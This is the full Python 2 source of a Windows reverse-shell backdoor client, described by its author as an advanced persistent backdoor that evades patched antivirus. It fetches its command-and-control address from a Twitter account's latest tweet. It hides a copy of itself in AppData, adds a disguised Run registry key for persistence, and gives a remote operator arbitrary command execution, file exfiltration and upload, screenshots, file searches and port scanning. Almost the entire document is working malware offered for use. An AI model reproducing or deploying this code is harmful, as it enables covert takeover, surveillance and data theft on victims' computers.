# Client - Advanced TCP Reverse Shell
# ===================================

'''
# --------------------------------------------------------------------------------------------#
#                                          INFOS                                              #
# --------------------------------------------------------------------------------------------#

Infos
=====
This script is an advanced persistant backdoor.
The IP and Port are retrieve though twitter last tweet.

- Runs on :     Windows
- Tested on :   Windows 7 SP1 x64 - Full patched with Avast
                Windows 10 x64 - Full patched with embedded AV

How to run
==========
- Complete pre-requites
To run this backdoor on target, it is needed to change the filename of the exe (at the begining of the main() function.).
It must match the final exe file after compilation with py2exe or pyinstaller or others.
Then it is reday to be executed on target host

Pre-requistes
=============
- py2exe or pyinstaller:
pip install pyinstaller
pyinstaller /path/to/yourscript.py --onefile

- BeautifulSoup:
pip install beautifulsoup4
Needed to reach twitter or whatever sites to update C&C.

- Pillow (ImageGrab):
pip install Pillow


All needed to compile the script into an standalone.exe (absolutly needed for persistence !!)
In main() function, it is necessary to change the name of the exe !!

If problems to compile, try to import the libraries manually to troubleshoot the ones missig.

changes log
===========
- screenshot, search and scanner functions added.

What to do next
===============
- See a way, when the server crash, for the client to reconnect
- make the client test other port in case the default one was blocked.



# --------------------------------------------------------------------------------------------#
#                                   IMPORTS and VARIABLES                                     #
# --------------------------------------------------------------------------------------------#
'''
# TCP reverse shell
import socket 
import subprocess  # to start the shell
import time

# Data exfiltration
import os          # needed for file opertaions

# Persistence
import shutil
import _winreg as wreg
import random  # Needed to generate random
import win32api, win32con # to make backdoor an hidden file

# Twitter C&C update
#from BeautifulSoup import BeautifulSoup as soupy
from bs4 import BeautifulSoup as soupy
import urllib
import re

# screenshot command
from PIL import ImageGrab # Used to Grab a screenshot
import tempfile           # Used to Create a temp directory
#import shutil             # Used to Remove the temp directory



'''
# --------------------------------------------------------------------------------------------#
#                                         FUNCTIONS                                           #
# --------------------------------------------------------------------------------------------#
'''

'''
This function parse last tweet of a twitter account and store it in new_cc variable
Navigate to twitter home page of an account, then store the HTML page into html variable and pass it to soupy function so we can parse it
then we search for specific HTML meta tags named 'description' and we retrieve the content
'''
def ip_up(url):
    html = urllib.urlopen(url).read()
    soup = soupy(html, "html.parser") 

    x = soup.find("meta", {"name":"description"})['content']

    filter = re.findall(r'"(.*?)"',x)  # After parsing the html page, our tweet is located between double quotations
    tweet =  filter[0]                 # using regular expression we filter out the tweet
    new_cc = tweet
    print "New C&C control from twitter! : " + new_cc
    return new_cc



'''
In the transfer function, we first check if the file exisits in the first place, if not we will notify the attacker
otherwise, we will create a loop where each time we iterate we will read 1 KB of the file and send it, since the
server has no idea about the end of the file we add a tag called 'DONE' to address this issue, finally we close the file
'''
def transfer(s,path):
    if os.path.exists(path):
        f = open(path, 'rb')
        packet = f.read(1024)
        while packet != '':
            s.send(packet) 
            packet = f.read(1024)
        s.send('DONE')
        f.close()
        
    else: # the file doesn't exist
        s.send('Unable to find out the file')



'''
Upload function: Receive file uploaded by the server

'''
def upload(s,command,dst_upload):
    junk,ext = command.split('.')
    filename = str(random.randrange(50,100)) + '.' + ext
    try :
        f = open(dst_upload + filename,'wb')
        #f = open('C:\\Users\\alex\\AppData\\Local\\Microsoft\\Windows\\' + filename,'wb')
        while True:  
            bits = s.recv(1024)
            if bits.endswith('DONE'):
                f.close()
                s.send('RECEIVED')
                break
            f.write(bits)
    except Exception,e:
        s.send ( str(e) )  # send the exception error
        pass



'''
Scanner function:
'''
def scanner(s,ip,ports):
    
    scan_result = '\n\n' # scan_result is a variable stores our scanning result
    
    for port in ports.split(','): # remember the ports are separated by a comma in this format 21,22,..
        
        try: # we will try to make a connection using socket library for EACH one of these ports
            
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            output = sock.connect_ex((ip, int(port) ))  #connect_ex This function returns 0 if the operation succeeded,  and in our case operation succeeded means that 
        #the connection happens whihch means the port is open otherwsie the port could be closed or the host is unreachable in the first place.
            
            if output == 0:
                scan_result = scan_result + "[+] Port " +port+ " is opened" +'\n'

            else:
                scan_result = scan_result + "[-] Port " +port+" is closed or Host is not reachable" +'\n'
                
            sock.close()
    
        except Exception, e:
            pass
    s.send (scan_result) # finally we send the result back to our kali

    

'''
Connect function:
'''
def connect(dst_upload):
    '''
    Retrieve C&C and connection section:
    - Retrieve C&C from twitter last tweet (format: IP:PORT)
    - Split the tweet into IP and PORT based on ':'
    - Create socket, connect with new C&C infos and wait to receive 1024 bits of data

    Commands section:
    - terminate:  When receive 'terminate' order from the server, break the loop and return 1 (which will break the parent loop).
    - up_cc:      When receive 'up_cc' order from the server, close the socket and return 2
    - download:   When receive 'download' order from the server, split the command and upload the file to the server. Example: download*C:\Users\<username>\Desktop\document.txt
        # if we received grab keyword from the attacker, then this is an indicator for
        # file transfer operation, hence we will split the received commands into two
        # parts, the second part which we intersted in contains the file path, so we will
        # store it into a varaible called path and pass it to transfer function
    
    - upload:       When receive 'upload' order from the server, call upload function to receive the file on this side.
                    Usage: download*<path>
    - screenshot:   When receive 'screenshot' order from the server, create temp directory, use PIL library to grab screenshot, transfer it to the server, then remove the tempdir.
                    Usage: screenshot
    - search:       When receive 'search' order from the server, uses os.walk() to retrieve all files, then match file with correct extension, send result back. 
                    Usage: search <path>*.<file extension>
    - scan:         When receive 'scan' order from the server,
                    Usage: scan 10.10.10.15:21,80

search function
===============
Usage: search <path>*.<file extension>
        
os.walk is a function that will naviagate ALL the directoies specified in the provided path and returns three values:
- dirpath: string that contains the path to the directory
- dirnames: list of the names of the subdirectories in dirpath
- files: list of the files name in dirpath

Once we got the files list, we check each file (using for loop), if the file extension was matching what we are looking for, then
we add the directory path into list string. the  os.path.join represents a path relative for our file to
the current directory and in our example it's the C:\\ directory
    
    '''
    new_cc = ip_up('https://twitter.com/xetbetcoder') 
    ip, port = new_cc.split(':')
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    
    s.connect((ip,int(port)))
    # s.connect(('192.168.1.10', 8080)) # Connect to a static C&C

    try: 
        while True: 
            command =  s.recv(1024)
        
            if 'terminate' in command:
                return 1

            elif 'cd' in command:                       # ex: cd C:\Users
                code,directory = command.split (' ')    # split up the reiceved command based on space into two variables
                os.chdir(directory)                     # changing the directory 
                s.send( "[+] CWD Is " + os.getcwd() )   # we send back a string mentioning the new CWD

            elif 'up_cc' in command:
                s.close()
                return 2

            elif 'download' in command:            
                download,path = command.split('*')
                try:
                    transfer(s,path)
                except Exception,e:
                    s.send ( str(e) )  # send the exception error
                    pass

            elif 'upload' in command:
                upload(s,command,dst_upload)

            elif 'screenshot' in command:
                dirpath = tempfile.mkdtemp()                        #Create a temp dir in C:\Users\<username>\AppData\Local\Temp", to store the screenshot
                ImageGrab.grab().save(dirpath + "\img.jpg", "JPEG") #Save the screencap in the temp dir
                screenshot = dirpath + "\img.jpg"
                try:
                    transfer(s,screenshot)                          #Transfer the file
                    shutil.rmtree(dirpath)                          #Remove the entire temp dir
                except Exception,e:
                    s.send ( str(e) )                               # send the exception error
                    pass

            elif 'search' in command:
                command = command[7:]           # cut off the the first 7 character, output would be  C:\\*.pdf
                path,ext=command.split('*')     # C:\\ will be stored in path variable and .pdf will be stored in ext variable
                list = ''  # This variable will save the result files list
            
                for dirpath, dirname, files in os.walk(path):
                    for file in files:
                        if file.endswith(ext):
                            list = list + '\n' + os.path.join(dirpath, file)
                s.send(list)

            elif 'scan' in command:             # syntax: scan 10.10.10.100:22,80
                command = command[5:]           # cut off the leading first 5 char 
                ip,ports = command.split(':')   # split the output into two sections where the first variable is the ip which we want to scan and the second variable is the list of ports
                                                # that we want to check its status
                scanner(s,ip,ports)
            
            else:
                CMD =  subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                s.send( CMD.stdout.read()  ) 
                s.send( CMD.stderr.read()  )

    except Exception,e:
                    s.send ( 'Error' + str(e) ) # send the exception error
                    s.close()
                    pass


'''
# --------------------------------------------------------------------------------------------#
#                                         PROGRAM                                             #
# --------------------------------------------------------------------------------------------#
'''

'''
Main function:
'''
def main ():

    ''' PHASE 1 - Recon
    - Get working directory where the server gets executed
    - Get the user profile
    - Specify where to copy the server --> Here we choose 'C:\Users\<UserName>\Documents\'

    - If it was the first time our backdoor gets executed, then Do phase 1 and phase 2 
    - If not os.path.exists(destination):
    - We copy the server.exe and set hidden attribute to it, from where it is to the user documents folder
    - We create a registry entry that point to the copied server.exe
    '''
    path = os.getcwd().strip('/n')
    Null,userprof = subprocess.check_output('set USERPROFILE', shell=True).split('=')    
    destination = userprof.strip('\n\r') + '\\AppData\\Local\\Microsoft\\Windows\\'  + str(random.randrange(100,99000)) + '.exe'

    dst_upload = userprof.strip('\n\r') + '\\AppData\\Local\\Microsoft\\Windows\\'
    
    try:
        shutil.copyfile(path+'\client_persitent.exe', destination)#You can replace   path+'\persistence.exe'  with  sys.argv[0] , the sys.argv[0] will return the file name and we will get the same result
        win32api.SetFileAttributes(destination,win32con.FILE_ATTRIBUTE_HIDDEN)  # Make the server an hidden file
        
        key = wreg.OpenKey(wreg.HKEY_CURRENT_USER, "Software\Microsoft\Windows\CurrentVersion\Run",0,
                             wreg.KEY_ALL_ACCESS)
        wreg.SetValueEx(key, 'RegUpdater', 0, wreg.REG_SZ,destination)
        key.Close()
    except:
        pass

    '''
    Last phase - Reverse connection back to our server
    - Start an infinite loop, we try to connect to our server, if we got an exception (connection error)
    - then we will sleep for a random time between 1 and 10 seconds and we will pass that exception and go back to the infinite loop once again untill we got a sucessful connection.
    '''
    while True:
    
        try:
            # If connect() function returns 1, then this means we got a 'terminate' order from the server and we should break this loop.
            if connect(dst_upload) == 1:
                break  # Terminate the process
            elif connect(dst_upload) == 2:
                pass
        except:
            # If we have a connection issue, we wait for a random time between 1 and 10 seconds and try to connect again. 
            sleep_for = random.randrange(1, 10)
            time.sleep( sleep_for )        #Sleep for a random time between 1-10 seconds
            #time.sleep( sleep_for * 60 )  #Sleep for a random time between 1-10 minutes
            pass  # Then pass instead of raising an exception
    
main()











